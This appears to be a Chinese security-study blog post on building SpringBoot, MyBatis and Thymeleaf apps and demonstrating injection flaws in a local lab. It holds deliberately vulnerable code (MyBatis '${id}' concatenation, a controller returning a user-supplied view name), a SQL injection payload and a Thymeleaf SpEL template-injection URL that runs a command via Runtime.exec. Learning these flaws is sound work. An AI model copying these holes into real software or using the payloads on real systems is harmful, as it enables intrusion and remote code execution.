---
title: JavaEE应用&SpringBoot框架&MyBatis注入&Thymeleaf模版注入
published: 2025-10-24
description: SpringBoot框架的使用，以及Mybatis和Thymeleaf(版本存在漏洞)注入。
tags: [JavaEE,安全开发]
category: 网络安全
draft: false
---

# JavaEE应用&SpringBoot框架&MyBatis注入&Thymeleaf模版注入

## Java知识点

功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等。

框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等。

技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，反射机制待补充。

安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充。

安全：原生开发安全，第三方框架安全，第三方库安全等，待补充。

## SpringBoot—Web 应用—路由响应

参考： https://springdoc.cn/spring-boot/

1. 路由映射
   @RequestMapping @GetMapping 等

2. 参数传递
   @RequestParam
3. 数据响应
   @RestController @Controller
   @RestController 注解相当于 @ResponseBody ＋ @Controller 合在一起的作用。

### 程序创建

创建新项目，现在原生脚手架没有Java8，所以需要把服务器Url处改为`https://start.aliyun.com/`，之后选择Spring Web。

创建Controller包以及下面的IndexController类，代码如下：

```java
package com.test.springbootdemo1.controller;

import org.springframework.web.bind.annotation.*;

@RestController
public class IndexController {

    //指定GET请求的访问路由
    @RequestMapping(value = "/indexget",method = RequestMethod.GET)
//    @GetMapping(value = "/indexget")
    public String getindex() {
        return "get index here";
    }

    //指定POST请求的访问路由
    @RequestMapping(value = "/indexpost",method = RequestMethod.POST)
//    @PostMapping(value = "/indexpost")
    public String postindex(){
        return "post index here";
    }
	
    //指定GET请求的访问路由 带参数名name
    @RequestMapping(value = "/indexget_g",method = RequestMethod.GET)
    //@GetMapping(value = "/xiaodiget")
    public String get_g(@RequestParam String name){
        return "get test"+name;
    }

    //指定POST请求的访问路由 带参数名name
    @RequestMapping(value = "/indexget_g",method = RequestMethod.POST)
    //@GetMapping(value = "/xiaodiget_g")
    public String get_p(@RequestParam String name){
        return "post test"+name;
    }

}
```

相应页面内容可参考：https://blog.csdn.net/m0_74930529/article/details/145760738

## SpringBoot—数据库应用—Mybatis

新建项目，依赖项选择以下（如果没勾选的话，后续可以在pom.xml中手动输入），之后启动Mysql。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3801.png)

启动Mysql之后，在项目中的application.yml或者application.properties中配置数据库连接信息。

在application.properties中是这样的：

```java
spring.datasource.driver-class-name=com.mysql.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:8088/javademo?characterEncoding=UTF-8
spring.datasource.username=admin
spring.datasource.password=123456
```

在application.yml中是这样的：

```java
spring:
	datasource:
		url: jdbc:mysql://localhost:8088/javademo
		username: admin
		password: 123456
		driver-class-name: com.mysql.cj.jdbc.Driver
```

创建entity/User，User类用来存储数据，代码如下：

```java
package com.test.springbootmybatisdemo1.entity;

public class User {
    private Integer id;
    private String name;
    private String nickname;

    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getNickname() {
        return nickname;
    }

    public void setNickname(String nickname) {
        this.nickname = nickname;
    }

    // 构造方法
    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", nickname='" + nickname + '\'' +
                '}';
    }
}
```

创建接口mapper/UserMapper，动态接口代理类实现，代码如下：

```java
package com.test.springbootmybatisdemo1.mapper;

import com.test.springbootmybatisdemo1.entity.User;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

@Mapper
public interface UserMapper {
    
    @Select("select * from user")
    // 演示sql注入时,这里需要放入参数id
    // 模糊查询 ${id}是拼接写法，#{id}是预编译写法
    @Select("Select * from user where id like '%${id}%'")
    public List<User> findAll();

    @Select("select * from user where id=1")
    public List<User> findById();
}
```

创建contrroller/GetUserController实现Web调用访问，代码如下：

```java
package com.test.springbootmybatisdemo1;

import com.test.springbootmybatisdemo1.entity.User;
import com.test.springbootmybatisdemo1.mapper.UserMapper;
import org.springframework.web.bind.annotation.GetMapping;

import java.util.List;

public class GetuserController {

    private UserMapper userMapper;

    @GetMapping("/getadmin")
    public List<User> getuserdata(){
        // 演示sql注入时，这里需改为 getuserdata(@RequestParam Integer id)
        // userMapper.findAll(id);
        List<User> all = userMapper.findAll();
        return all;
    }

    @GetMapping("/getid")
    public List<User> getuserid(){
        List<User> all = userMapper.findById();
        return all;
    }

}
```

运行结果：

因为SpringBoot自带Json包，所以返回的数据是Json格式。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3802.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3803.png)

### 安全问题

mybatis的sql注入。

[Mybatis中SQL注入攻击的3种方式，真是防不胜防](https://baijiahao.baidu.com/s?id=1747445413331443209&wfr=spider&for=pc)

[MyBatis-sql注入问题_mybatis sql注入-CSDN博客](https://blog.csdn.net/java123456111/article/details/123575051)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/8e58095fb3ef4d88ab5404519cbc6fe5.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/883d05a7ff154514afd7d46ffa0b509f.png)

注入如下（数据库查询没问题，但在实际页面注入报错了）：

我们设置的sql语句是` select * from name where id like '%${id}%'`，此时我们只要把id=1`的查询改为` id=1%' or 1=1# `即可产生sql注入，这是因为当参数拼接上去之后sql语句就变成这样子了。

```sql
select * from user where id like '%1%' or 1=1#'
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3804.png)

## SpringBoot—模版引擎—Thymeleaf

### Thymeleaf

[thymeleaf模板注入学习与研究--查找与防御](https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg)

创建项目ThyremeafDemo，依赖项选择Thyremeaf，配置在application中可以看到路径之后创建templates，在下面创建index.html，代码如下：

```html
<!DOCTYPE html>
<html  xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body >
<span th:text="${data}">测试模板</span>
</body>
</html>
```

创建controller.ThymeleafController

注意：（还要看.idea出现workspace.xml这个文件没有）

// @RestController 自带ResponseBody，把index当做字符串显示操作。
// @Controller 没有ResponseBody，把index当做资源文件去渲染。

代码如下：

```java
package com.test.thyremeafdemo.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class ThyremeafController {
    @RequestMapping("/index")
    public String index(Model model) {
        model.addAttribute("data","hello attackor7");
        return "index";
    }

}
```

### 安全问题

日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题

例如：更换中英文页面模板

#### 实操

创建index-en.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
 
</body>
</html>
```

 修改ThymeleafController：

```java
package cn.xiadou.thyremeafdemo.controller;
 
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
 
@Controller
public class ThymeleafController {
//    @RequestMapping(value = "/")
//    public String index(Model model) {
//        model.addAttribute("data","hello xiaodi");
//        //@RestController 自带ResponseBody，把index当做字符串显示操作。
//        //@Controller 没有ResponseBody，把index当做资源文件去渲染。
//        return "index";
//    }
 
    @RequestMapping(value = "/test")
    public String index() {
        //@RestController youResponseBody index当做字符串显示操作
        //Controller 没有ResponseBody index当做资源文件去渲染
        return "test";
    }
 
    @RequestMapping(value = "/")
    public String index(@RequestParam String lang) {
        //@RestController ResponseBody index当做字符串显示操作
        //Controller 没有ResponseBody index当做资源文件去渲染
        return lang; //lang=en index-en
    }
}
```

对于不同版本的Thymeleaf，他可能会造成漏洞：

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/398abfbe675240d3929de85b608c44c2.png)

使用阿里云的版本2.6.13：

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/f5caa9f8e0384765a8b33842e258cfe0.png)

注入代码：（发现报错）

```url
http://127.0.0.1:8080/?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
```

替换pom.xml使其变换版本，重新构建：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
 
    <groupId>org.springframework</groupId>
    <artifactId>java-spring-thymeleaf</artifactId>
    <version>1.0</version>
 
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <!--latest-->
        <version>2.2.0.RELEASE</version>
    </parent>
 
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
 
    </dependencies>
 
    <properties>
        <java.version>1.8</java.version>
    </properties>
 
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
```

注入成功：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3805.png)